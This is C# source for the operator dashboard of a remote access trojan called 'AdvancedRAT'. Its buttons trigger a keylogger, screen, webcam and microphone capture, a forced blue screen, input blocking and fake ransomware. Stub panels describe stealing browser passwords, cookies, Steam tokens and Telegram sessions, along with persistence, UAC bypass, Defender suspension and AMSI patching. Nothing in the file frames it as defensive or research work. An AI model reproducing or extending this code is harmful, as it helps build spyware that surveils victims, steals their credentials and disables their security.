using System;
using System.Windows;
using System.Windows.Controls;
using System.Threading.Tasks;
using AdvancedRAT.Core.Modules;
using AdvancedRAT.Core.Communication;

namespace AdvancedRAT.UI.ClientConsole
{
    public partial class Dashboard : Window
    {
        public Dashboard()
        {
            InitializeComponent();
            InitializeDashboard();
        }

        private async void InitializeDashboard()
        {
            // Update status
            statusText.Text = "Initializing...";
            
            // Try to establish connection
            await Task.Run(async () =>
            {
                await EncryptedChannel.StartListening();
            });
            
            // Update UI on UI thread
            Dispatcher.Invoke(() =>
            {
                connectionStatus.Text = "Connected";
                connectionStatus.Foreground = System.Windows.Media.Brushes.Green;
                statusText.Text = "Ready";
            });
        }

        private void SidebarButton_Click(object sender, RoutedEventArgs e)
        {
            Button clickedButton = sender as Button;
            string tag = clickedButton.Tag.ToString();

            // Clear content area
            contentArea.Children.Clear();

            // Load appropriate content based on button clicked
            switch (tag)
            {
                case "systemInfo":
                    LoadSystemInfo();
                    break;
                case "liveView":
                    LoadLiveView();
                    break;
                case "fileManager":
                    LoadFileManager();
                    break;
                case "keylogger":
                    LoadKeylogger();
                    break;
                case "trolling":
                    LoadTrolling();
                    break;
                case "stealer":
                    LoadStealer();
                    break;
                case "persistence":
                    LoadPersistence();
                    break;
                case "security":
                    LoadSecurity();
                    break;
            }
        }

        private void LoadSystemInfo()
        {
            TextBlock infoBlock = new TextBlock
            {
                Text = "System Information Panel\n\nThis panel would display comprehensive system information collected from the target machine.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(infoBlock);
        }

        private void LoadLiveView()
        {
            TextBlock liveViewBlock = new TextBlock
            {
                Text = "Live View Panel\n\nThis panel would show real-time screen capture, webcam feed, and microphone input from the target machine.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(liveViewBlock);
        }

        private void LoadFileManager()
        {
            TextBlock fileManagerBlock = new TextBlock
            {
                Text = "File Manager Panel\n\nThis panel would allow browsing and managing files on the target machine.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(fileManagerBlock);
        }

        private void LoadKeylogger()
        {
            TextBox keylogBox = new TextBox
            {
                Text = Keylogger.GetLogContent(),
                IsReadOnly = true,
                AcceptsReturn = true,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Height = 400,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(keylogBox);
        }

        private void LoadTrolling()
        {
            StackPanel trollingPanel = new StackPanel { Margin = new Thickness(10) };

            Button bsodButton = new Button
            {
                Content = "Activate BSOD",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            bsodButton.Click += async (s, e) => await Trolling.ActivateBSOD();

            Button wallpaperButton = new Button
            {
                Content = "Change Wallpaper",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            wallpaperButton.Click += async (s, e) => await Trolling.ChangeWallpaper("");

            Button maximizeButton = new Button
            {
                Content = "Maximize All Windows",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            maximizeButton.Click += async (s, e) => await Trolling.MaximizeAllWindows();

            Button flashButton = new Button
            {
                Content = "Flash Windows",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            flashButton.Click += async (s, e) => await Trolling.FlashWindows();

            Button blockInputButton = new Button
            {
                Content = "Block User Input",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            blockInputButton.Click += async (s, e) => await Trolling.BlockUserInput();

            Button fakeRansomwareButton = new Button
            {
                Content = "Activate Fake Ransomware",
                Margin = new Thickness(5),
                Padding = new Thickness(10, 5, 10, 5)
            };
            fakeRansomwareButton.Click += async (s, e) => await Trolling.FakeRansomware();

            trollingPanel.Children.Add(bsodButton);
            trollingPanel.Children.Add(wallpaperButton);
            trollingPanel.Children.Add(maximizeButton);
            trollingPanel.Children.Add(flashButton);
            trollingPanel.Children.Add(blockInputButton);
            trollingPanel.Children.Add(fakeRansomwareButton);

            contentArea.Children.Add(trollingPanel);
        }

        private void LoadStealer()
        {
            TextBlock stealerBlock = new TextBlock
            {
                Text = "Stealer Panel\n\nThis panel would display stolen data including browser passwords, cookies, autofill data, Steam tokens, and Telegram sessions.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(stealerBlock);
        }

        private void LoadPersistence()
        {
            TextBlock persistenceBlock = new TextBlock
            {
                Text = "Persistence Panel\n\nThis panel would manage persistence mechanisms to keep the RAT active on the target machine.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(persistenceBlock);
        }

        private void LoadSecurity()
        {
            TextBlock securityBlock = new TextBlock
            {
                Text = "Security Panel\n\nThis panel would show security-related features like UAC bypass, Defender suspension, AMSI patching, etc.",
                Foreground = System.Windows.Media.Brushes.White,
                FontSize = 14,
                Margin = new Thickness(10)
            };
            contentArea.Children.Add(securityBlock);
        }

        private async void TakeScreenshot_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                statusText.Text = "Taking screenshot...";
                byte[] screenshotData = await ScreenCapture.CaptureScreen();
                
                if (screenshotData.Length > 0)
                {
                    statusText.Text = "Screenshot captured successfully";
                }
                else
                {
                    statusText.Text = "Screenshot failed";
                }
            }
            catch (Exception ex)
            {
                statusText.Text = $"Screenshot error: {ex.Message}";
            }
        }

        private async void TakeWebcamShot_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                statusText.Text = "Capturing webcam...";
                byte[] webcamData = await WebcamController.CaptureWebcamImage();
                
                if (webcamData.Length > 0)
                {
                    statusText.Text = "Webcam image captured successfully";
                }
                else
                {
                    statusText.Text = "Webcam capture failed or no camera available";
                }
            }
            catch (Exception ex)
            {
                statusText.Text = $"Webcam error: {ex.Message}";
            }
        }

        private async void RecordMicrophone_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                statusText.Text = "Recording microphone...";
                byte[] audioData = await MicrophoneRecorder.RecordAudio(5); // 5 seconds
                
                if (audioData.Length > 0)
                {
                    statusText.Text = "Microphone recording completed";
                }
                else
                {
                    statusText.Text = "Microphone recording failed or no mic available";
                }
            }
            catch (Exception ex)
            {
                statusText.Text = $"Microphone error: {ex.Message}";
            }
        }

        private void KillProcess_Click(object sender, RoutedEventArgs e)
        {
            // Implementation would go here
            statusText.Text = "Kill process functionality would be implemented here";
        }

        public static void Show()
        {
            Application app = new Application();
            Dashboard dashboard = new Dashboard();
            app.Run(dashboard);
        }
    }
}